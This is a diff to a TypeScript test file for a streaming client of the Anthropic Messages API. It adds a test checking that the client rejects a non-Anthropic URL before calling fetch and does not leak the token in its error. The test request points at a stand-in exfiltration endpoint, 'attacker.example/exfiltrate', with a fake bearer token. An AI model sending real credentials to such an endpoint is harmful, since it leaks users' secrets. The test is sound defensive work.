@@ -13,7 +13,7 @@ import type {
 import type { AnthropicSseEvent } from "../src/anthropic-sse.ts";
 import { CLAUDE_CODE_IDENTITY } from "../src/constants.ts";
 import { getNativeCacheDiagnosticsSnapshot, resetNativeCacheDiagnostics } from "../src/native-cache-diagnostics.ts";
-import { buildNativeMessagesRequest, type NativeMessagesRequest, type NativeMessagesRequestInput } from "../src/native-request.ts";
+import { ANTHROPIC_MESSAGES_URL, buildNativeMessagesRequest, type NativeMessagesRequest, type NativeMessagesRequestInput } from "../src/native-request.ts";
 import { createNativeStreamSimple, streamNativeMessagesSse, streamNativeMessagesSseEvents } from "../src/native-stream-simple.ts";
 import { getNativeUsageTelemetrySnapshot, resetNativeUsageTelemetry } from "../src/native-usage-telemetry.ts";
 
@@ -53,12 +53,23 @@ function context(): Context {
 }
 
 function requestFrom(input: NativeMessagesRequestInput): NativeMessagesRequest {
+  // Default mock URL: defense-in-depth so tests that go through a mocked
+  // streamRequest never accidentally reach api.anthropic.com if the mock is
+  // misconfigured. Tests that intentionally exercise the real fetch path must
+  // opt in via requestForMockedAnthropicFetch().
   return {
     url: "mock://anthropic/messages",
     method: "POST",
     headers: { Authorization: `Bearer ${input.accessToken}` },
     body: input.payload,
   };
+}
+
+// Use only when the test mocks globalThis.fetch and exercises the real
+// fetchNativeMessagesResponse path. Sets the canonical Anthropic URL so the
+// production URL invariant is satisfied; the mocked fetch ignores the URL.
+function requestForMockedAnthropicFetch(input: NativeMessagesRequestInput): NativeMessagesRequest {
+  return { ...requestFrom(input), url: ANTHROPIC_MESSAGES_URL };
 }
 
 function createHarness(parserEvents: AnthropicSseEvent[]) {
@@ -1179,12 +1190,46 @@ test("streamNativeMessagesSseCallsOnResponseBeforeReturningBody", async () => {
       headers: { "request-id": "req_hook" },
     })) as typeof fetch;
 
-    const body = await streamNativeMessagesSse(requestFrom({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
+    const body = await streamNativeMessagesSse(requestForMockedAnthropicFetch({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
       onResponse: async (response) => { hookResponse = response; },
     });
 
     assert.match(body, /message_stop/);
     assert.deepEqual(hookResponse, { status: 200, headers: { "content-type": "text/plain;charset=UTF-8", "request-id": "req_hook" } });
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("streamNativeMessagesSseRejectsNonAnthropicUrlBeforeFetch", async () => {
+  const originalFetch = globalThis.fetch;
+  let fetchCalls = 0;
+
+  try {
+    globalThis.fetch = (async () => {
+      fetchCalls += 1;
+      return new Response("should not be reached", { status: 200 });
+    }) as typeof fetch;
+
+    const exfiltrationRequest: NativeMessagesRequest = {
+      ...requestFrom({ accessToken: FAKE_TOKEN, payload: { stream: true } }),
+      url: "https://attacker.example/exfiltrate",
+    };
+
+    await assert.rejects(
+      () => streamNativeMessagesSse(exfiltrationRequest, {
+        knownSecrets: [FAKE_TOKEN, `Bearer ${FAKE_TOKEN}`],
+      }),
+      (err: unknown) => {
+        assert.ok(err instanceof Error, "must throw an Error");
+        assert.match(err.message, /api\.anthropic\.com/, "error must mention the only allowed Anthropic endpoint");
+        assert.ok(!err.message.includes("attacker.example"), "error must not echo attacker-controlled URL");
+        assert.ok(!err.message.includes(FAKE_TOKEN), "error must not leak OAuth token");
+        return true;
+      },
+    );
+
+    assert.equal(fetchCalls, 0, "globalThis.fetch must not be invoked when the URL invariant fails");
   } finally {
     globalThis.fetch = originalFetch;
   }
@@ -1204,7 +1249,7 @@ test("streamNativeMessagesSseReportsAnthropicRequestIdOnError", async () => {
     )) as typeof fetch;
 
     await assert.rejects(
-      () => streamNativeMessagesSse(requestFrom({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
+      () => streamNativeMessagesSse(requestForMockedAnthropicFetch({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
         knownSecrets: [FAKE_TOKEN, `Bearer ${FAKE_TOKEN}`],
       }),
       (err: unknown) => {
@@ -1267,7 +1312,7 @@ test("streamNativeMessagesSseEventsParsesResponseBodyIncrementally", async () =>
       },
     }), { status: 200, headers: { "request-id": "req_stream" } })) as typeof fetch;
 
-    for await (const event of await streamNativeMessagesSseEvents(requestFrom({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
+    for await (const event of await streamNativeMessagesSseEvents(requestForMockedAnthropicFetch({ accessToken: FAKE_TOKEN, payload: { stream: true } }), {
       onResponse: async (response) => {
         hookCalled = true;
         assert.equal(response.status, 200);
